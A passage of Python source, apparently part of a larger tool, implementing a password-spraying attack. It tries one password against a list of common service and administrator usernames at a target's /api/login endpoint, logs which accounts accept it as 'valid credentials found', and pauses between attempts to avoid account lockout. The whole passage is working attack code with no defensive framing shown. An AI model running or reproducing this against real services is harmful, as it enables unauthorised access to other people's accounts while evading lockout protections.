            "svc_web",
            "svc_db",
            "ec2-user",
            "ssm-user",
            "centos",
            "fedora",
            "ubuntu",
            "sysadmin",
            "operator",
            "audit",
            "security",
            "readonly",
            "reports",
            "backup_admin",
        ]

        found = []
        tried = 0
        stopped_early = False
        for username in users:
            if time.monotonic() >= deadline:
                stopped_early = True
                break
            tried += 1
            try:
                budget = _sock_budget(8.0, deadline)
                if budget <= 0:
                    stopped_early = True
                    break
                with _open_connection(host, dport, budget) as s:
                    body = json.dumps({"username": username, "password": password}).encode()
                    req = (
                        f"POST /api/login HTTP/1.0\r\n"
                        f"Host: {host_hdr}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"\r\n"
                    ).encode() + body
                    s.sendall(req)
                    resp = s.recv(4096).decode(errors="replace")

                    status_line = resp.split("\r\n")[0] if resp else ""
                    if "200" in status_line or "302" in status_line:
                        result_lines.append(f"  [+] {username} — SUCCESS ({status_line[:60]})")
                        found.append(username)
                    else:
                        result_lines.append(f"  [-] {username} — {status_line[:60]}")
            except Exception as e:  # ponytail: bare except intentional
                result_lines.append(f"  [!] {username} — error: {e}")
            time.sleep(1.5)  # Delay to avoid lockout

        if stopped_early:
            result_lines.append(f"Stopped at tool deadline after {tried}/{len(users)} users.")
            result_lines.append("")

        if found:
            result_lines.append(f"[+] {len(found)} valid credentials found: {found}")
        else:
            result_lines.append("[-] No valid credentials found with this password.")

        return _finish(result_lines)
